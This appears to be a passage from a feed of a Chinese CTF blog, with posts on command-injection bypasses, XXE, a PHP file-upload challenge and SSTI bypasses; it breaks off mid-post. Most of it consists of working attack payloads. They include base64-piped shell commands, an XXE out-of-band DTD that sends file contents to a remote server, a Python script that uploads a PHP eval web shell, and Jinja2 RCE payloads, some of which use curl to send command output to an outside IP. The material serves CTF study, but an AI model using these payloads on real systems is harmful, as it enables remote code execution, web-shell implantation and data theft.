、&lt;&gt;、%20(space)、%09(tab)、$IFS$1、$IFS$9、$&#123;IFS&#125;、$IFS</code></pre><h3 id="payload-经过-base64-绕过"><a href="#payload-经过-base64-绕过" class="headerlink" title="payload 经过 base64 绕过"></a>payload 经过 base64 绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> Y2F0IC9mbGFn|<span class="built_in">base64</span> -d|sh</span><br><span class="line">`<span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|<span class="built_in">base64</span> -d`</span><br></pre></td></tr></table></figure><h1 id="重要文件"><a href="#重要文件" class="headerlink" title="重要文件"></a>重要文件</h1><pre><code>/proc/self/environ/proc/1/environ/etc/hosts/etc/passwd/var/log/nginx/access.log/var/log/apache2/access.log/proc/self/fd/3/proc/self/cmdline/flag/var/www/html/flag.php/var/www/html/flag.txt/var/www/html/flag</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;命令执行&quot;&gt;&lt;a href=&quot;#命令执行&quot; class=&quot;headerlink&quot; title=&quot;命令执行&quot;&gt;&lt;/a&gt;命令执行&lt;/h1&gt;&lt;h2 id=&quot;常见命令执行命令&quot;&gt;&lt;a href=&quot;#常见命令执行命令&quot; class=&quot;headerlink&quot; title=&quot;常</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XXE</title>
    <link href="https://blog.hatchet.top/posts/e93ac459.html"/>
    <id>https://blog.hatchet.top/posts/e93ac459.html</id>
    <published>2024-09-18T15:47:42.000Z</published>
    <updated>2024-09-20T12:20:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE （PHP 5.45 之后不解析实体）</p><pre><code>&lt;!DOCTYPE 根标签名 SYSTEM &quot;文件名&quot;&gt;</code></pre><p>DTD 实体是用于定义引用文本或字符的快捷方式的变量，可内部声明或外部引用。</p><p>约束通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合：</p><pre><code>&lt;!ELEMENT 标签名 ANY&gt;</code></pre><p>同时 xxe 可进行内网探测读取 &#x2F;etc&#x2F;hosts</p><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><h2 id="PHP-文件读取"><a href="#PHP-文件读取" class="headerlink" title="PHP 文件读取"></a>PHP 文件读取</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h2 id="file-协议读取文件"><a href="#file-协议读取文件" class="headerlink" title="file 协议读取文件"></a>file 协议读取文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h2 id="SVG-格式"><a href="#SVG-格式" class="headerlink" title="SVG 格式"></a>SVG 格式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;/etc/passwd&quot; &gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;</span><br><span class="line">&lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><h2 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a>数据外带</h2><p>攻击服务器创建 shell.dtd：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://127.0.0.1:5555/?flag=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://174.1.66.167/shell.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">%remote;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h2 id="xxe-绕过的-payload"><a href="#xxe-绕过的-payload" class="headerlink" title="xxe 绕过的 payload"></a>xxe 绕过的 payload</h2><p>当只过滤了 SYSTEM，PUBLIC 等关键字时，可用双重实体编码绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE GVI [</span><br><span class="line"></span><br><span class="line">    &lt;!ENTITY % xml &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;&gt;</span><br><span class="line"></span><br><span class="line">    %xml;</span><br></pre></td></tr></table></figure><p>即为在 xml 实体中再定义一次 xml，可成功被解析，支持 dtd 数据外带</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;core&gt;</span><br><span class="line">      &lt;message&gt;&amp;xxe;&lt;/message&gt;</span><br><span class="line">&lt;/core&gt;</span><br></pre></td></tr></table></figure><p>XXE 待复现<br>转自 <a href="https://wiki.wgpsec.org/knowledge/ctf/xxe.html">https://wiki.wgpsec.org/knowledge/ctf/xxe.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XXE&quot;&gt;&lt;a href=&quot;#XXE&quot; class=&quot;headerlink&quot; title=&quot;XXE&quot;&gt;&lt;/a&gt;XXE&lt;/h1&gt;&lt;p&gt;XXE （PHP 5.45 之后不解析实体）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE 根标签名 SYSTEM &amp;qu</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>[奇安信]Web-4-littledropbox</title>
    <link href="https://blog.hatchet.top/posts/89707270.html"/>
    <id>https://blog.hatchet.top/posts/89707270.html</id>
    <published>2024-09-18T15:31:42.000Z</published>
    <updated>2024-09-20T12:21:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="little-dropbox"><a href="#little-dropbox" class="headerlink" title="little dropbox"></a>little dropbox</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$uploadDir</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>, <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>))) <span class="keyword">die</span>(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]), <span class="string">&#x27;&lt;?&#x27;</span>) !== False) <span class="keyword">die</span>(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$info</span>[<span class="number">0</span>] !== <span class="number">100</span> || <span class="variable">$info</span>[<span class="number">1</span>] !== <span class="number">50</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$uploadDir</span> . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ready</span> = <span class="title function_ invoke__">filter_input</span>(INPUT_GET, <span class="string">&#x27;ready&#x27;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">filter_input</span>(INPUT_GET, <span class="string">&#x27;key&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ready</span> === <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;secretKey&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;secretKey&quot;</span>] = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;secretKey&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[0]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">225</span>; <span class="variable">$i</span>++) <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[226]</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[227]</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[228]</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$key</span> === (<span class="keyword">string</span>)<span class="variable">$_SESSION</span>[<span class="string">&#x27;secretKey&#x27;</span>]) &#123;</span><br><span class="line">        <span class="title function_ invoke__">upload</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="构造伪随机数"><a href="#构造伪随机数" class="headerlink" title="构造伪随机数"></a>构造伪随机数</h2><p>一开始需要构造 key 才能上传题目,开始时考虑使用专门进行种子爆破的 php_mt_seed 工具<br>后来百度发现无需暴力破解就可以计算原始种子<br><a href="https://www.anquanke.com/post/id/196831">https://www.anquanke.com/post/id/196831</a><br>前提要求是给定间隔 227 个值的两个 mt_rand()输出结果，例如第 1 个和第 228 个 mt_rand()的输出结果<br>下载 mt_rand-reverse-master<br><a href="https://github.com/ambionics/mt_rand-reverse">https://github.com/ambionics/mt_rand-reverse</a><br>传参 127.0.0.1:100&#x2F;upload.php?ready&#x3D;1</p><pre><code>412630690&lt;br&gt;1046894031&lt;br&gt;1961239210&lt;br&gt;2006731948&lt;br&gt;Cookie:PHPSESSID=o065m8ssj0dakiv4iijtsp8sq6</code></pre><p>传第 0 个和第 227 个 mt_rand()值</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python reverse_mt_rand.py <span class="number">412630690</span> <span class="number">1961239210</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>得到 key 值 1955787332</p><h2 id="构造绕过-PHP-文件上传"><a href="#构造绕过-PHP-文件上传" class="headerlink" title="构造绕过 PHP 文件上传"></a>构造绕过 PHP 文件上传</h2><p>使用文件名加点绕过,linux 在处理文件时会自动省略点号<br>内容用 js 语言&lt;script language&#x3D;”php”&gt;绕过<br>内容大小要求 100*50，使用 python 库 PIL 自动生成</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标上传的 URL</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:100/upload.php/?ready=1&amp;key=1955787332&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;o065m8ssj0dakiv4iijtsp8sq6&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造图片（100x50），并在图片数据中嵌入恶意 PHP 代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_image_with_payload</span>():</span><br><span class="line">    <span class="comment"># 创建一个 100x50 的空白图片</span></span><br><span class="line">    img = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">100</span>, <span class="number">50</span>), color=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    img_byte_arr = BytesIO()</span><br><span class="line">    img.save(img_byte_arr, <span class="built_in">format</span>=<span class="string">&quot;PNG&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># PHP payload，嵌入到文件末尾</span></span><br><span class="line">    payload = <span class="string">b&quot;&lt;script language=\&quot;php\&quot;&gt;eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将图片数据和 payload 结合起来</span></span><br><span class="line">    img_data = img_byte_arr.getvalue() + payload</span><br><span class="line">    <span class="keyword">return</span> img_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造上传请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="comment"># 生成带有 payload 的图片</span></span><br><span class="line">    img_data = create_image_with_payload()</span><br><span class="line">    filename = <span class="string">&quot;shell.php.&quot;</span></span><br><span class="line">    <span class="comment"># 构造文件参数</span></span><br><span class="line">    files = &#123;<span class="string">&quot;file&quot;</span>: (filename, img_data, <span class="string">&quot;image/png&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送 POST 请求，上传文件</span></span><br><span class="line">    response = requests.post(url, files=files, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出上传结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response status:&quot;</span>, response.status_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response body:&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload_file()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后访问 127.0.0.1:100&#x2F;uploads&#x2F;md5($_SERVER[‘REMOTE_ADDR’])&#x2F;shell.php 用蚁剑连接，密码为 cmd。</p>]]></content>
    
    
    <summary type="html">一道PHP文件上传+伪随机数绕过题</summary>
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
    <category term="PHP" scheme="https://blog.hatchet.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>各种ssti绕过及脚本</title>
    <link href="https://blog.hatchet.top/posts/301c82e9.html"/>
    <id>https://blog.hatchet.top/posts/301c82e9.html</id>
    <published>2024-08-29T13:44:29.000Z</published>
    <updated>2024-09-25T08:15:25.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="判断网站类型"><a href="#判断网站类型" class="headerlink" title="判断网站类型"></a>判断网站类型</h1><h2 id="自己查找判断"><a href="#自己查找判断" class="headerlink" title="自己查找判断"></a>自己查找判断</h2><ul><li>在页面或者抓包回复里有时会泄露类型</li></ul><h2 id="在疑似-ssti-处注入-7-7"><a href="#在疑似-ssti-处注入-7-7" class="headerlink" title="在疑似 ssti 处注入 ${7*7}"></a>在疑似 ssti 处注入 ${7*7}</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><h4 id="a-comment-b"><a href="#a-comment-b" class="headerlink" title="a{*comment*}b"></a>a{*comment*}b</h4><ul><li>ab -&gt; smarty</li></ul><h4 id="“z”-join-“ab”-z"><a href="#“z”-join-“ab”-z" class="headerlink" title="${“z”.join(“ab”)}z"></a>${“z”.join(“ab”)}z</h4><ul><li>zab -&gt; mako</li></ul><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><h4 id="7-‘7’"><a href="#7-‘7’" class="headerlink" title="{{7*‘7’}}"></a>{{7*‘7’}}</h4><ul><li>49 -&gt; Twig,smarty</li><li>7777777 -&gt; Jinja2 &#x2F;&#x2F;最常见的 ssti 类型</li></ul><h1 id="各种类型"><a href="#各种类型" class="headerlink" title="各种类型"></a>各种类型</h1><h2 id="Jinja2-python"><a href="#Jinja2-python" class="headerlink" title="Jinja2(python)"></a>Jinja2(python)</h2><h3 id="常规信息搜集"><a href="#常规信息搜集" class="headerlink" title="常规信息搜集"></a>常规信息搜集</h3><p>{{config}}</p><p>{{self.__dict__}}</p><p>{{url_for.__globals__}}</p><ul><li>{{url_for.__globals__[‘current_app’].config[‘FLAG’]}}</li></ul><p>{{datetime}}</p><pre><code>{{a.__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)}}</code></pre><p>一个特解，不一定有效，如果有效可以直接实现 RCE</p><h3 id="利用危险类"><a href="#利用危险类" class="headerlink" title="利用危险类"></a>利用危险类</h3><h4 id="利用进行注入"><a href="#利用进行注入" class="headerlink" title="利用&lt;class ‘object’&gt;进行注入"></a>利用&lt;class ‘object’&gt;进行注入</h4><p>用这些可访问对象作为开头</p><pre><code>[]&#39;&#39;&quot;&quot;()dictconfigrequest</code></pre><p>并用 base 或 mro 找到&lt;class ‘object’&gt;</p><pre><code>{{&#39;&#39;.__class__.__bases__[0]}} // &lt;class &#39;object&#39;&gt;{{&#39;&#39;.__class__.__mro__[2]}}// &lt;class &#39;object&#39;&gt;</code></pre><p>使用 subclasses 找到危险类</p><pre><code>{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[?]}}</code></pre><p>在？里填数字可以得到 对应的类，我们需要寻找危险类，它们能执行危险函数。<br>这里使用 os._wrap_close<br>跑脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:20440/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">f&quot;&#123;&#123;&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[<span class="subst">&#123;i&#125;</span>]&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line">    <span class="comment"># GET</span></span><br><span class="line">    res = requests.get(url=url + <span class="string">f&quot;?name=<span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># POST</span></span><br><span class="line">    <span class="comment"># data = &#123;</span></span><br><span class="line">    <span class="comment">#     &quot;flag&quot;: payload,</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">    <span class="comment"># res = requests.post(url, data=data)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>拿到危险类后就可以随意构造了<br>这里跑出来值为 127</p><pre><code>#read&amp;write{{ &#39;&#39;.__class__.__bases__[0].__subclasses__()[127](&#39;/etc/passwd&#39;).read() }}{{ &#39;&#39;.__class__.__bases__[0].__subclasses__()[127](&#39;&#39;, &#39;w&#39;).write(&#39;Hello&#39;) }}#RCE{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()}}{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)}}#无回显使用curl命令带出数据{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;curl 120.46.41.173:9023/`ls /app/f*`&#39;).read()}}{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;curl 120.46.41.173:9023/`tac /app/fl4gfl4gfl4g`&#39;).read()}}</code></pre><h4 id="不使用"><a href="#不使用" class="headerlink" title="不使用&lt;class ‘object’&gt;"></a>不使用&lt;class ‘object’&gt;</h4><p>{{ request.__class__.__dict__ }}</p><ul><li>application</li><li>_load_form_data</li><li>on_json_loading_failed</li></ul><p>{{ config.__class__.__dict__}}</p><ul><li>__init__</li><li>from_envvar</li><li>from_pyfile</li><li>from_object</li><li>from_file</li><li>from_json</li><li>from_mapping</li><li>get_namespace</li><li>__repr__</li></ul><p>如果有回显出以下的全局对象</p><pre><code># Read file{{ request.__class__._load_form_data.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read() }}# RCE{{ config.__class__.from_envvar.__globals__.__builtins__.__import__(&quot;os&quot;).popen(&quot;ls&quot;).read() }}{{ config.__class__.from_envvar[&quot;__globals__&quot;][&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;ls&quot;).read() }}{{ (config|attr(&quot;__class__&quot;)).from_envvar[&quot;__globals__&quot;][&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;ls&quot;).read() }}{% with a = request[&quot;application&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&quot;\x5f\x5fimport\x5f\x5f&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls&quot;)[&quot;read&quot;]() %} {{ a }} {% endwith %}</code></pre><h3 id="一点关于-ssti-的绕过"><a href="#一点关于-ssti-的绕过" class="headerlink" title="一点关于 ssti 的绕过"></a>一点关于 ssti 的绕过</h3><ul><li><strong>()即小括号是不可绕过的</strong></li></ul><h4 id="request-绕过-没被过滤全部可绕"><a href="#request-绕过-没被过滤全部可绕" class="headerlink" title="request 绕过(没被过滤全部可绕)"></a>request 绕过(没被过滤全部可绕)</h4><p>可以直接帮你绕过引号内的内容</p><pre><code>{{config.__class__.__init__.__globals__[request.args.os].popen(request.args.command).read()}}&amp;os=os&amp;command=cat /flag</code></pre><h4 id="chr-绕过-没被过滤全部可绕"><a href="#chr-绕过-没被过滤全部可绕" class="headerlink" title="chr 绕过(没被过滤全部可绕)"></a>chr 绕过(没被过滤全部可绕)</h4><p>先找到 chr 所需的危险类</p><pre><code>{%set chr = x.__init__.__globals__[&#39;__builtins__&#39;].chr%}{{&quot;&quot;chr(46)+chr(95)+chr(95)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)+chr(95)+chr(46)+chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95)}}</code></pre><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$str</span>=<span class="string">&#x27;__class__.__bases__&#x27;</span>;</span><br><span class="line">    <span class="variable">$ans</span>=<span class="string">&#x27;chr(&#x27;</span>.<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="number">0</span>]).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ans</span>.=<span class="string">&#x27;+chr(&#x27;</span>.<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ans</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="过滤了双大括号"><a href="#过滤了双大括号" class="headerlink" title="过滤了双大括号{{}}"></a>过滤了双大括号{{}}</h4><p>{{…}} -&gt; {%print(…)%}</p><h4 id="过滤了下划线"><a href="#过滤了下划线" class="headerlink" title="过滤了下划线"></a>过滤了下划线</h4><p>{{()|select|string}} 结果为<br>&lt;generator object select_or_reject at 0x7f7a6a450eb0&gt;<br>我们可以发现这里面出现了下划线，我们就可以造出下划线了<br>{{(()|select|string)[?]}}</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&lt;generator object select_or_reject at 0x7f7a6a450eb0&gt;&quot;</span></span><br><span class="line">pos = <span class="built_in">str</span>.find(<span class="string">&quot;_&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(pos)</span><br><span class="line">payload = <span class="string">f&quot;&#123;&#123;&#123;&#123;(()|select|string)[<span class="subst">&#123;pos&#125;</span>]&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h4 